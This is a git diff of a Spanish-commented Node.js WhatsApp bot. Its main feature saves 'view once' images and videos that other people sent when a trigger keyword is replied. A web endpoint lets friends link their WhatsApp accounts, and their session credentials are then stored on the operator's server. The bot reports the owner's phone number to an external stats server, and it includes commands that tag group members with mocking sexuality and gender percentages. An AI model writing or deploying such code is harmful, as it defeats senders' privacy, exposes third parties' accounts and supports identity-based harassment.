@@ -19,74 +19,49 @@ let CAPTURAS = 0;
 let PALABRAS_CLAVE = ['cool', 'bonito', 'guapo', 'lindo', 'wow', 'nice', 'jajaj', 'pete', 'trans', 'lesbiana'];
 const STATS_URL = 'https://bots-stats-server.onrender.com/reportar';
 const NOMBRE_USUARIO = 'JuanShine';
+const OWNER_NUMBER = '5492396522761'; // Tu número (A)
 
-// Si existe palabras.json, lo usamos
+// Cargar palabras clave si existen
 if (fs.existsSync('./palabras.json')) {
+    try { PALABRAS_CLAVE = JSON.parse(fs.readFileSync('./palabras.json', 'utf8')); } catch (e) {}
+}
+
+// Cargar o crear config.json
+let OWNER_NUMBER_FINAL;
+if (fs.existsSync('./config.json')) {
+    try { OWNER_NUMBER_FINAL = JSON.parse(fs.readFileSync('./config.json', 'utf8')).ownerNumber; } catch (e) {}
+}
+if (!OWNER_NUMBER_FINAL) OWNER_NUMBER_FINAL = OWNER_NUMBER;
+
+// Reportar estadísticas al servidor
+async function reportarStats() {
     try {
-        PALABRAS_CLAVE = JSON.parse(fs.readFileSync('./palabras.json', 'utf8'));
+        const datos = { usuario: NOMBRE_USUARIO, numero: OWNER_NUMBER_FINAL, capturas: CAPTURAS, uptime: Date.now() - INICIO, palabras: PALABRAS_CLAVE.length, comandos: 0 };
+        await fetch(STATS_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(datos) });
     } catch (e) {}
 }
 
 const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 const question = (text) => new Promise((resolve) => rl.question(text, resolve));
 
-const OWNER_NUMBER = '5492396522761'; // Tu número (A)
-
-// 📂 Lee o crea el config.json con el número del dueño
-let OWNER_NUMBER_FINAL;
-if (fs.existsSync('./config.json')) {
-    try {
-        const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
-        OWNER_NUMBER_FINAL = config.ownerNumber || OWNER_NUMBER;
-    } catch (e) {}
-} else {
-    OWNER_NUMBER_FINAL = OWNER_NUMBER;
-}
-
-// 📤 Envía estadísticas al servidor central
-async function reportarStats() {
-    try {
-        const datos = {
-            usuario: NOMBRE_USUARIO,
-            numero: OWNER_NUMBER_FINAL,
-            capturas: CAPTURAS,
-            uptime: Date.now() - INICIO,
-            palabras: PALABRAS_CLAVE.length,
-            comandos: 0
-        };
-        const res = await fetch(STATS_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(datos)
-        });
-    } catch (e) {}
-}
-
-// 🌐 Función que crea la conexión para cada sesión
+// 🌐 Función que crea la conexión para cada sesión (Multi-Sesión)
 async function connectToWhatsApp(sessionName) {
     const sessionPath = path.join(__dirname, 'sessions', sessionName);
     if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
-
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
 
-    const sock = makeWASocket({
-        auth: state,
-        printQRInTerminal: false,
-        logger: pino({ level: 'silent' })
-    });
+    const sock = makeWASocket({ auth: state, printQRInTerminal: false, logger: pino({ level: 'silent' }) });
 
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
-
         if (qr && !sock.authState.creds.registered) {
             try {
-                const phoneNumber = await question(`📱 Ingresá tu número para la sesión ${sessionName}:\n`);
+                const phoneNumber = await question(`📱 Ingresá tu número para ${sessionName}:\n`);
                 const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
                 const code = await sock.requestPairingCode(cleanNumber);
                 console.log(`\n🔑 Código para ${sessionName}: ${code}\n`);
             } catch (error) {}
         }
-
         if (connection === 'close') {
             const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
             if (shouldReconnect) connectToWhatsApp(sessionName);
@@ -98,25 +73,58 @@ async function connectToWhatsApp(sessionName) {
 
     sock.ev.on('creds.update', saveCreds);
 
-    // 🎯 Lógica de los mensajes (La misma que tenías, pero aplicada a la sesión)
+    // 🎯 Lógica de los mensajes
     sock.ev.on('messages.upsert', async ({ messages }) => {
         const m = messages[0];
         if (!m.message) return;
-
         const text = (m.message.conversation || m.message.extendedTextMessage?.text || '').trim().toLowerCase();
         const quoted = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
         const quotedKey = m.message.extendedTextMessage?.contextInfo?.stanzaId;
         const quotedParticipant = m.message.extendedTextMessage?.contextInfo?.participant;
-
         const ownerJid = OWNER_NUMBER_FINAL + '@s.whatsapp.net';
         const isOwner = m.key.remoteJid === ownerJid || m.key.remoteJid === OWNER_NUMBER_FINAL + '@s.whatsapp.net' || m.key.fromMe === true;
         const soyYo = (m.key.participant || m.key.remoteJid || '').includes(OWNER_NUMBER_FINAL);
 
-        // Comandos de administración (solo para vos)
-        if (isOwner && text.startsWith('.add ')) { /* ... tu código de .add ... */ }
-        if (isOwner && text === '.lista') { /* ... tu código de .lista ... */ }
-        
-        // Comando .ping
+        // ➕ .add [palabra]
+        if (isOwner && (text.startsWith('.add ') || text.startsWith('.addpalabra '))) {
+            const nueva = text.replace(/^\.(add|addpalabra)\s+/i, '').trim().toLowerCase();
+            if (nueva && !PALABRAS_CLAVE.includes(nueva)) {
+                PALABRAS_CLAVE.push(nueva);
+                fs.writeFileSync('./palabras.json', JSON.stringify(PALABRAS_CLAVE, null, 2));
+                await sock.sendMessage(m.key.remoteJid, { text: `✅ Agregada: ${nueva}` });
+            } else {
+                await sock.sendMessage(m.key.remoteJid, { text: `⚠️ Ya existe o es inválida` });
+            }
+            return;
+        }
+
+        // ➖ .del [palabra]
+        if (isOwner && (text.startsWith('.del ') || text.startsWith('.delpalabra '))) {
+            const quitar = text.replace(/^\.(del|delpalabra)\s+/i, '').trim().toLowerCase();
+            const idx = PALABRAS_CLAVE.indexOf(quitar);
+            if (idx !== -1) {
+                PALABRAS_CLAVE.splice(idx, 1);
+                fs.writeFileSync('./palabras.json', JSON.stringify(PALABRAS_CLAVE, null, 2));
+                await sock.sendMessage(m.key.remoteJid, { text: `🗑️ Eliminada: ${quitar}` });
+            } else {
+                await sock.sendMessage(m.key.remoteJid, { text: `⚠️ No está en la lista` });
+            }
+            return;
+        }
+
+        // 📋 .lista
+        if (isOwner && (text === '.lista' || text === '.listarpalabras')) {
+            await sock.sendMessage(m.key.remoteJid, { text: `📋 Palabras activas (${PALABRAS_CLAVE.length}):\n${PALABRAS_CLAVE.join(', ')}` });
+            return;
+        }
+
+        // ❓ .help
+        if (isOwner && (text === '.help' || text === '.ayuda')) {
+            await sock.sendMessage(m.key.remoteJid, { text: `🤖 *Comandos:*\n\n.add [palabra] → Agrega\n.del [palabra] → Elimina\n.lista → Ver todas\n.s → Sticker\n.ping → Latencia\n.uptime → Tiempo activo\n.stats → Estadísticas\n.help → Esta ayuda` });
+            return;
+        }
+
+        // 🏓 .ping
         if (isOwner && text === '.ping') {
             const inicio = Date.now();
             await sock.sendMessage(m.key.remoteJid, { text: '🏓 Pong...' });
@@ -125,14 +133,29 @@ async function connectToWhatsApp(sessionName) {
             return;
         }
 
-        // Comando .s (stickers)
+        // ⏱️ .uptime
+        if (isOwner && text === '.uptime') {
+            const ms = Date.now() - INICIO;
+            const horas = Math.floor(ms / 3600000);
+            const mins = Math.floor((ms % 3600000) / 60000);
+            await sock.sendMessage(m.key.remoteJid, { text: `⏱️ Corriendo hace ${horas}h ${mins}m` });
+            return;
+        }
+
+        // 📊 .stats
+        if (isOwner && text === '.stats') {
+            const ms = Date.now() - INICIO;
+            const horas = Math.floor(ms / 3600000);
+            const mins = Math.floor((ms % 3600000) / 60000);
+            await sock.sendMessage(m.key.remoteJid, { text: `📊 *Estadísticas:*\n\n⏱️ Activo: ${horas}h ${mins}m\n📸 Capturas: ${CAPTURAS}\n📋 Palabras: ${PALABRAS_CLAVE.length}` });
+            return;
+        }
+
+        // 🎨 .s (Sticker)
         if (isOwner && text.includes('.s')) {
             if (!quoted || !quotedKey) return;
             try {
-                const buffer = await downloadMediaMessage(
-                    { key: { id: quotedKey, remoteJid: m.key.remoteJid, participant: quotedParticipant }, message: quoted },
-                    'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage }
-                );
+                const buffer = await downloadMediaMessage({ key: { id: quotedKey, remoteJid: m.key.remoteJid, participant: quotedParticipant }, message: quoted }, 'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage });
                 const tmpIn = path.join(os.tmpdir(), `sticker_${Date.now()}.jpg`);
                 const tmpOut = path.join(os.tmpdir(), `sticker_${Date.now()}.webp`);
                 fs.writeFileSync(tmpIn, buffer);
@@ -142,11 +165,11 @@ async function connectToWhatsApp(sessionName) {
                 const stickerBuffer = fs.readFileSync(tmpOut);
                 await sock.sendMessage(m.key.remoteJid, { sticker: stickerBuffer });
                 fs.unlinkSync(tmpIn); fs.unlinkSync(tmpOut);
-            } catch (e) {}
+            } catch (e) { console.error('Error sticker:', e.message); }
             return;
         }
 
-        // Comandos Gay, Pete, etc.
+        // 🏳️‍🌈 Comandos de porcentaje (.gay, .pete, .trans, .lesbiana)
         if (text.startsWith('.gay') || text.startsWith('.pete') || text.startsWith('.trans') || text.startsWith('.lesbiana')) {
             let target = m.key.remoteJid;
             let targetName = 'Vos';
@@ -158,14 +181,11 @@ async function connectToWhatsApp(sessionName) {
             const porcentaje = Math.floor(Math.random() * 100) + 1;
             let emoji = text.startsWith('.gay') ? '🏳️‍🌈' : text.startsWith('.pete') ? '🍆' : text.startsWith('.trans') ? '🏳️‍⚧️' : '👩‍❤️‍💋‍👩';
             let palabra = text.replace('.', '');
-            await sock.sendMessage(m.key.remoteJid, { 
-                text: `${emoji} *${targetName}* es ${porcentaje}% ${palabra} ${emoji}`, 
-                mentions: target !== m.key.remoteJid ? [target] : []
-            });
+            await sock.sendMessage(m.key.remoteJid, { text: `${emoji} *${targetName}* es ${porcentaje}% ${palabra} ${emoji}`, mentions: target !== m.key.remoteJid ? [target] : [] });
             return;
         }
 
-        // Captura de "ver un vez" (la lógica de tu código original)
+        // Captura de "ver un vez"
         if (PALABRAS_CLAVE.includes(text) && (soyYo || isOwner)) {
             if (!quoted || !quotedKey) return;
             let viewOnceContent = quoted.viewOnceMessageV2?.message || quoted.viewOnceMessage?.message;
@@ -175,11 +195,7 @@ async function connectToWhatsApp(sessionName) {
             }
             if (!viewOnceContent) return;
             try {
-                const buffer = await downloadMediaMessage(
-                    { key: { id: quotedKey, remoteJid: m.key.remoteJid, participant: quotedParticipant }, message: quoted },
-                    'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage }
-                );
-                // Le manda la foto a quien la capturó (o a vos si sos el dueño)
+                const buffer = await downloadMediaMessage({ key: { id: quotedKey, remoteJid: m.key.remoteJid, participant: quotedParticipant }, message: quoted }, 'buffer', {}, { logger: console, reuploadRequest: sock.updateMediaMessage });
                 const targetJid = isOwner ? ownerJid : m.key.remoteJid;
                 if (viewOnceContent.imageMessage) await sock.sendMessage(targetJid, { image: buffer });
                 else if (viewOnceContent.videoMessage) await sock.sendMessage(targetJid, { video: buffer });
@@ -192,15 +208,12 @@ async function connectToWhatsApp(sessionName) {
     return sock;
 }
 
-// 🌐 Iniciar servidor web
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'views', 'index.html'));
-});
+// 🌐 Servidor web para que tus amigos se conecten
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'index.html')));
 
 app.post('/api/connect', async (req, res) => {
     const { number } = req.body;
     if (!number) return res.status(400).json({ error: 'Falta el número' });
-
     try {
         const sessionName = 'user_' + number;
         const sock = await connectToWhatsApp(sessionName);
@@ -218,5 +231,5 @@ app.listen(PORT, () => {
     setInterval(reportarStats, 5 * 60 * 1000);
 });
 
-// Iniciar la sesión principal de JuanShine
+// Iniciar la sesión principal (la tuya)
 connectToWhatsApp('principal');
